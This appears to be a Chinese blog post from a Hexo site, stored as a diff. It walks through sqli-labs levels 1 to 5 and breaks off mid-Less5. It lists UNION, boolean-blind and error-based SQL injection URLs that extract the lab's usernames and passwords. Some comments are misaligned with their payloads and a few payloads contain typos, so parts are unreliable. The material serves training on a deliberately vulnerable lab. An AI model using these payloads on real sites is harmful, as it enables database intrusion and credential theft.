@@ -1,0 +1,629 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+    <meta charset="utf-8">
+
+    
+
+    <!-- 渲染优化 -->
+    <meta name="renderer" content="webkit">
+    <meta name="force-rendering" content="webkit">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta name="HandheldFriendly" content="True" >
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <!--icon-->
+
+    
+    
+    
+    
+    
+
+
+    <!-- meta -->
+
+
+<title>sqli-labs 通关笔记 | YEYEYETO</title>
+
+
+
+
+
+    <!-- OpenGraph -->
+ 
+    <meta name="description" content="查库：select schema_name from information_schema.schemata查表：select table_name from information_schema.tables where table_schema&#x3D;’security’查列：select column_name from information_schema.columns where">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs 通关笔记">
+<meta property="og:url" content="https://yeyeyeyeto.github.io/%E5%AE%89%E5%85%A8/2024-06-16-security/sqli-labs.html">
+<meta property="og:site_name" content="YEYEYETO">
+<meta property="og:description" content="查库：select schema_name from information_schema.schemata查表：select table_name from information_schema.tables where table_schema&#x3D;’security’查列：select column_name from information_schema.columns where">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://yeyeyeyeto.github.io/images/20230519124731.png">
+<meta property="og:image" content="https://yeyeyeyeto.github.io/images/20230605164552.png">
+<meta property="og:image" content="https://yeyeyeyeto.github.io/images/20230605171806.png">
+<meta property="article:published_time" content="2024-06-15T20:13:28.000Z">
+<meta property="article:modified_time" content="2024-06-15T12:30:29.128Z">
+<meta property="article:author" content="Eternal">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://yeyeyeyeto.github.io/images/20230519124731.png">
+
+
+    
+<link rel="stylesheet" href="/css/style/main.css">
+ 
+
+    
+    
+        <link rel="stylesheet" id="hl-default-theme" href="/css/highlight/highlight.css" media="none" >
+        
+            <link rel="stylesheet" id="hl-dark-theme" href="/css/highlight/highlight.dark.css" media="none">
+        
+    
+
+    
+    
+
+    
+    
+<link rel="stylesheet" href="/css/style/dark.css">
+
+    
+<script src="/js/darkmode.js"></script>
+
+
+
+     
+
+    <!-- custom head -->
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+    <body>
+        <div id="app" tabindex="-1">
+            <header class="header">
+    <div class="header__left">
+        <a href="/" class="button">
+            <span class="logo__text">YEYEYEYETO</span>
+        </a>
+    </div>
+    <div class="header__right">
+        
+            <div class="navbar__menus">
+                
+                    <a href="/" class="navbar-menu button">首页</a>
+                
+                    <a href="/tags/" class="navbar-menu button">标签</a>
+                
+                    <a href="/categories/" class="navbar-menu button">分类</a>
+                
+                    <a href="/archives/" class="navbar-menu button">归档</a>
+                
+                    <a href="/about/" class="navbar-menu button">关于</a>
+                
+            </div>
+        
+        
+        
+    <a href="/search/" id="btn-search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="24" height="24" fill="currentColor" stroke="currentColor" stroke-width="32"><path d="M192 448c0-141.152 114.848-256 256-256s256 114.848 256 256-114.848 256-256 256-256-114.848-256-256z m710.624 409.376l-206.88-206.88A318.784 318.784 0 0 0 768 448c0-176.736-143.264-320-320-320S128 271.264 128 448s143.264 320 320 320a318.784 318.784 0 0 0 202.496-72.256l206.88 206.88 45.248-45.248z"></path></svg>
+    </a>
+
+
+        
+        
+    <a href="javaScript:void(0);" id="btn-toggle-dark">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>
+    </a>
+
+
+        
+            <a class="dropdown-icon button" id="btn-dropdown" tabindex="0"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" width='24' height='24' fill="none" stroke="currentColor" stroke-width="0.7" stroke-linecap="round" stroke-linejoin="round"><path fill="currentColor" d="M3.314,4.8h13.372c0.41,0,0.743-0.333,0.743-0.743c0-0.41-0.333-0.743-0.743-0.743H3.314c-0.41,0-0.743,0.333-0.743,0.743C2.571,4.467,2.904,4.8,3.314,4.8z M16.686,15.2H3.314c-0.41,0-0.743,0.333-0.743,0.743s0.333,0.743,0.743,0.743h13.372c0.41,0,0.743-0.333,0.743-0.743S17.096,15.2,16.686,15.2z M16.686,9.257H3.314c-0.41,0-0.743,0.333-0.743,0.743s0.333,0.743,0.743,0.743h13.372c0.41,0,0.743-0.333,0.743-0.743S17.096,9.257,16.686,9.257z"></path></svg></a>
+            <div class="dropdown-menus" id="dropdown-menus">
+                
+                    <a href="/" class="dropdown-menu button">首页</a>
+                
+                    <a href="/tags/" class="dropdown-menu button">标签</a>
+                
+                    <a href="/categories/" class="dropdown-menu button">分类</a>
+                
+                    <a href="/archives/" class="dropdown-menu button">归档</a>
+                
+                    <a href="/about/" class="dropdown-menu button">关于</a>
+                
+            </div>
+        
+    </div>
+</header>
+
+
+            <main class="main">
+    
+
+<div class="post-title">
+    <h1 class="post-title__text">
+        sqli-labs 通关笔记
+    </h1>
+    <div class="post-title__meta">
+        <a href="/archives/2024/06/" class="post-meta__date button">2024-06-15</a>
+        
+    <span class="separate-dot"></span><a href="/categories/%E5%AE%89%E5%85%A8/" class="button">安全</a>
+
+ 
+        
+    
+    
+
+
+ 
+
+ 
+    </div>
+</div>
+
+
+    <aside class="post-side">
+        <div class="post-side__toc">
+            <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#Less1"><span class="toc-text">Less1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less2"><span class="toc-text">Less2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less3"><span class="toc-text">Less3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less4"><span class="toc-text">Less4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less5"><span class="toc-text">Less5</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8"><span class="toc-text">报错盲注</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8"><span class="toc-text">延时盲注</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less6"><span class="toc-text">Less6</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less7"><span class="toc-text">Less7</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less8"><span class="toc-text">Less8</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less9"><span class="toc-text">Less9</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less10"><span class="toc-text">Less10</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less11"><span class="toc-text">Less11</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less12"><span class="toc-text">Less12</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less13"><span class="toc-text">Less13</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less14"><span class="toc-text">Less14</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less15"><span class="toc-text">Less15</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less16"><span class="toc-text">Less16</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less17"><span class="toc-text">Less17</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less18"><span class="toc-text">Less18</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less19"><span class="toc-text">Less19</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less20"><span class="toc-text">Less20</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less21"><span class="toc-text">Less21</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less22"><span class="toc-text">Less22</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less23"><span class="toc-text">Less23</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less24"><span class="toc-text">Less24</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less25"><span class="toc-text">Less25</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less26"><span class="toc-text">Less26</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less27"><span class="toc-text">Less27</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less28"><span class="toc-text">Less28</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less29"><span class="toc-text">Less29</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less30"><span class="toc-text">Less30</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less31"><span class="toc-text">Less31</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less32"><span class="toc-text">Less32</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less33"><span class="toc-text">Less33</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less34"><span class="toc-text">Less34</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less35"><span class="toc-text">Less35</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less36"><span class="toc-text">Less36</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less37"><span class="toc-text">Less37</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less38"><span class="toc-text">Less38</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less39"><span class="toc-text">Less39</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less40"><span class="toc-text">Less40</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less41"><span class="toc-text">Less41</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less42"><span class="toc-text">Less42</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less43"><span class="toc-text">Less43</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less44"><span class="toc-text">Less44</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less45"><span class="toc-text">Less45</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less46"><span class="toc-text">Less46</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less47"><span class="toc-text">Less47</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less48"><span class="toc-text">Less48</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less49"><span class="toc-text">Less49</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less50"><span class="toc-text">Less50</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less51"><span class="toc-text">Less51</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less52"><span class="toc-text">Less52</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less53"><span class="toc-text">Less53</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less54"><span class="toc-text">Less54</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less55"><span class="toc-text">Less55</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less56"><span class="toc-text">Less56</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less57"><span class="toc-text">Less57</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less58"><span class="toc-text">Less58</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less59"><span class="toc-text">Less59</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less60"><span class="toc-text">Less60</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less61"><span class="toc-text">Less61</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less62"><span class="toc-text">Less62</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less63"><span class="toc-text">Less63</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less64"><span class="toc-text">Less64</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less65"><span class="toc-text">Less65</span></a></li></ol>
+        </div>
+    </aside>
+    <a class="btn-toc button" id="btn-toc" tabindex="0">
+        <svg viewBox="0 0 1024 1024" width="32" height="32" xmlns="http://www.w3.org/2000/svg">
+            <path d="M128 256h64V192H128zM320 256h576V192H320zM128 544h64v-64H128zM320 544h576v-64H320zM128 832h64v-64H128zM320 832h576v-64H320z" fill="currentColor"></path>
+        </svg>
+    </a>
+    <div class="toc-menus" id="toc-menus">
+        <div class="toc-title">文章目录</div>
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#Less1"><span class="toc-text">Less1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less2"><span class="toc-text">Less2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less3"><span class="toc-text">Less3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less4"><span class="toc-text">Less4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less5"><span class="toc-text">Less5</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8"><span class="toc-text">报错盲注</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8"><span class="toc-text">延时盲注</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less6"><span class="toc-text">Less6</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less7"><span class="toc-text">Less7</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less8"><span class="toc-text">Less8</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less9"><span class="toc-text">Less9</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less10"><span class="toc-text">Less10</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less11"><span class="toc-text">Less11</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less12"><span class="toc-text">Less12</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less13"><span class="toc-text">Less13</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less14"><span class="toc-text">Less14</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less15"><span class="toc-text">Less15</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less16"><span class="toc-text">Less16</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less17"><span class="toc-text">Less17</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less18"><span class="toc-text">Less18</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less19"><span class="toc-text">Less19</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less20"><span class="toc-text">Less20</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less21"><span class="toc-text">Less21</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less22"><span class="toc-text">Less22</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less23"><span class="toc-text">Less23</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less24"><span class="toc-text">Less24</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less25"><span class="toc-text">Less25</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less26"><span class="toc-text">Less26</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less27"><span class="toc-text">Less27</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less28"><span class="toc-text">Less28</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less29"><span class="toc-text">Less29</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less30"><span class="toc-text">Less30</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less31"><span class="toc-text">Less31</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less32"><span class="toc-text">Less32</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less33"><span class="toc-text">Less33</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less34"><span class="toc-text">Less34</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less35"><span class="toc-text">Less35</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less36"><span class="toc-text">Less36</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less37"><span class="toc-text">Less37</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less38"><span class="toc-text">Less38</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less39"><span class="toc-text">Less39</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less40"><span class="toc-text">Less40</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less41"><span class="toc-text">Less41</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less42"><span class="toc-text">Less42</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less43"><span class="toc-text">Less43</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less44"><span class="toc-text">Less44</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less45"><span class="toc-text">Less45</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less46"><span class="toc-text">Less46</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less47"><span class="toc-text">Less47</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less48"><span class="toc-text">Less48</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less49"><span class="toc-text">Less49</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less50"><span class="toc-text">Less50</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less51"><span class="toc-text">Less51</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less52"><span class="toc-text">Less52</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less53"><span class="toc-text">Less53</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less54"><span class="toc-text">Less54</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less55"><span class="toc-text">Less55</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less56"><span class="toc-text">Less56</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less57"><span class="toc-text">Less57</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less58"><span class="toc-text">Less58</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less59"><span class="toc-text">Less59</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less60"><span class="toc-text">Less60</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less61"><span class="toc-text">Less61</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less62"><span class="toc-text">Less62</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less63"><span class="toc-text">Less63</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less64"><span class="toc-text">Less64</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less65"><span class="toc-text">Less65</span></a></li></ol>
+    </div>
+
+
+<article class="post post__with-toc content-card">
+    <div class="post__header"></div>
+    <div class="post__content">
+        <p>查库：select schema_name from information_schema.schemata<br>查表：select table_name from information_schema.tables where table_schema&#x3D;’security’<br>查列：select column_name from information_schema.columns where table_name&#x3D;’users’<br>查字段：select username, password from security.users</p>
+<h4 id="Less1"><a href="#Less1" class="headerlink" title="Less1"></a>Less1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">传入ID值，页面正常，查看是否有注入</span><br><span class="line">http://192.168.8.1/sqli-labs/Less-1/?id=1 </span><br><span class="line"></span><br><span class="line">添加单引号，页面出错</span><br><span class="line">http://192.168.8.1/sqli-labs/Less-1/?id=1&#x27; </span><br><span class="line"></span><br><span class="line">添加注释，页面回归正常</span><br><span class="line">http://192.168.8.1/sqli-labs/Less-1/?id=1’ --+ </span><br><span class="line"></span><br><span class="line">测试看数据中共有多少列</span><br><span class="line">http://192.168.8.1/sqli-labs/Less-1/?id=1’ order by 3 --+ </span><br><span class="line"></span><br><span class="line">选择3列(有多少选多少)，没有回显信息。</span><br><span class="line">http://192.168.8.1/sqli-labs/Less-1/?id=1’ union select 1,2,3 --+ </span><br><span class="line"></span><br><span class="line">使前面的ID值报错(给零或负数都可以)，查看哪些数据可以回显</span><br><span class="line">http://192.168.8.1/sqli-labs/Less-1/?id=-1’ union select 1,2,3 --+ </span><br><span class="line"></span><br><span class="line">查看当前数据库</span><br><span class="line">http://192.168.8.1/sqli-labs/Less-1/?id=-1’ union select 1,2,database() --+ </span><br><span class="line"></span><br><span class="line">可以看到表的名字</span><br><span class="line">http://192.168.8.1/sqli-labs/Less-1/?id=-1&#x27; union select 1,2,schema_name from information_schema.schemata --+ </span><br><span class="line"></span><br><span class="line">使用limit可以查看别的位置的表名  使用group_concat可以看到所有的表名</span><br><span class="line">http://192.168.8.1/sqli-labs/Less-1/?id=-1&#x27; union select 1,2,schema_name from information_schema.schemata limit 2,1 --+ </span><br><span class="line"></span><br><span class="line">查看security表中的信息</span><br><span class="line">http://192.168.8.1/sqli-labs/Less-1/?id=-1&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata --+  </span><br><span class="line"></span><br><span class="line">security改为16进制格式：在前面添加0x，选择security - Encoding - Hex Encode</span><br><span class="line">http://192.168.8.1/sqli-labs/Less-1/?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; --+ </span><br><span class="line"></span><br><span class="line">查user</span><br><span class="line">http://192.168.8.1/sqli-labs/Less-1/?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0xsecurity --+ </span><br><span class="line"></span><br><span class="line">取出password</span><br><span class="line">http://192.168.8.1/sqli-labs/Less-1/?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0xusers --+ </span><br><span class="line"></span><br><span class="line">使用group_concat取出所有password</span><br><span class="line">http://192.168.8.1/sqli-labs/Less-1/?id=-1&#x27; union select 1,2,password from security.users --+ </span><br><span class="line"></span><br><span class="line">使用concat_ws连接password和username，再使用group_concat取出全部</span><br><span class="line">http://192.168.8.1/sqli-labs/Less-1/?id=-1&#x27; union select 1,2,group_concat(password) from security.users --+ </span><br><span class="line"></span><br><span class="line">对concat_ws中的参数进行16进制转换，选择字符转换后添加0x前缀，去掉引号</span><br><span class="line">http://192.168.8.1/sqli-labs/Less-1/?id=-1&#x27; union select 1,2,group_concat(concat_ws(&#x27;~&#x27;,username,password)) from security.users --+ </span><br><span class="line">http://192.168.8.1/sqli-labs/Less-1/?id=-1&#x27; union select 1,2,group_concat(concat_ws(&#x27;~&#x27;,username,password)) from security.users --+</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="Less2"><a href="#Less2" class="headerlink" title="Less2"></a>Less2</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.8.1/sqli-labs/Less-2/?id=1 and 1=1 --+</span><br><span class="line">http://192.168.8.1/sqli-labs/Less-2/?id=1 and 1=2 --+</span><br><span class="line">http://192.168.8.1/sqli-labs/Less-2/?id=-1 union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users --+</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="Less3"><a href="#Less3" class="headerlink" title="Less3"></a>Less3</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.8.1/sqli-labs/Less-3/?id=1&#x27;) --+</span><br><span class="line">http://192.168.8.1/sqli-labs/Less-3/?id=1&#x27;) order by 3 --+</span><br><span class="line">http://192.168.8.1/sqli-labs/Less-3/?id=-1&#x27;) union select 1,2,3 --+</span><br><span class="line">http://192.168.8.1/sqli-labs/Less-3/?id=-1&#x27;) union select 1,2,group_concat(concat_ws(&#x27;~&#x27;,username,password)) from security.users --+</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="Less4"><a href="#Less4" class="headerlink" title="Less4"></a>Less4</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.8.1/sqli-labs/Less-4/?id=1&quot;) and 1=1 --+</span><br><span class="line">http://192.168.8.1/sqli-labs/Less-4/?id=1&quot;) and 1=2 --+</span><br><span class="line">http://192.168.8.1/sqli-labs/Less-4/?id=-1&quot;) union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="Less5"><a href="#Less5" class="headerlink" title="Less5"></a>Less5</h4><h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><ol>
+<li>获取数据库名字的长度<br> ?id&#x3D;1’ and length(database())&#x3D;{} –+</li>
+<li>获取数据库的名字<br> ?id&#x3D;1’ and left((select database()),{})&#x3D;’{}’ –+</li>
+<li>获取数据库中的表<ol>
+<li>获取库中表的个数<br> ?id&#x3D;1’ and (select count(*) tables from information_schema.tables where table_schema&#x3D;’{}‘)&#x3D;{} –+</li>
+<li>获取每个表名称的长度<br> ?id&#x3D;1’ and (select length(table_name) from information_schema.tables where table_schema&#x3D;’{}’ limit {},1)&#x3D;{} –+</li>
+<li>获取每个表的名称<br> ?id&#x3D;1’ and left((select table_name from information_schema.tables where table_schema&#x3D;’{}’ limit {},1),{})&#x3D;’{}’ –+</li>
+</ol>
+</li>
+<li>获取表中的列<ol>
+<li>获取列的个数<br> ?id&#x3D;1’ and (select count(*) columns from information_schema.columns where table_name&#x3D;’{}’)&#x3D;{} –+</li>
+<li>获取列名称的长度<br> ?id&#x3D;1’ and (select length(column_name) from information_schema.columns where table_name&#x3D;’{}’ limit {},1)&#x3D;{} –+</li>
+<li>获取列的名称<br> ?id&#x3D;1’ and left((select column_name from information_schema.columns where table_name&#x3D;’{}’ limit {},1),{})&#x3D;’{}’ –+</li>
+</ol>
+</li>
+<li>取出列表中的元素<ol>
+<li>元素的个数<br> ?id&#x3D;1’ and (select count(}) from {}.{})&#x3D;{} –+</li>
+<li>元素的长度<br> ?id&#x3D;1’ and (select length({}) from {}.{} limit {},1)&#x3D;{} –+</li>
+<li>元素的名称<br> ?id&#x3D;1’ and left((select {} from {}.{} limit {},1),{})&#x3D;’{}’ –+</li>
+</ol>
+</li>
+</ol>
+<h5 id="报错盲注"><a href="#报错盲注" class="headerlink" title="报错盲注"></a>报错盲注</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqllib/Less-5/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select user()),0 x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</span><br><span class="line"></span><br><span class="line">利用 double 数值类型超出范围进行报错注入</span><br><span class="line">http://127.0.0.1/sqllib/Less-5/?id=1&#x27; union select (exp(~(select * FROM(SELECT USER())a))),2, 3--+</span><br><span class="line"></span><br><span class="line">利用 bigint 溢出进行报错注入 </span><br><span class="line">http://127.0.0.1/sqllib/Less-5/?id=1&#x27; union select (!(select * from (select user())x) - ~0),2,3- -+ </span><br><span class="line"></span><br><span class="line">xpath 函数报错注入</span><br><span class="line">http://127.0.0.1/sqllib/Less-5/?id=1&#x27; and extractvalue(1,concat(0x7e,(select @@version),0x7e)) --</span><br><span class="line"></span><br><span 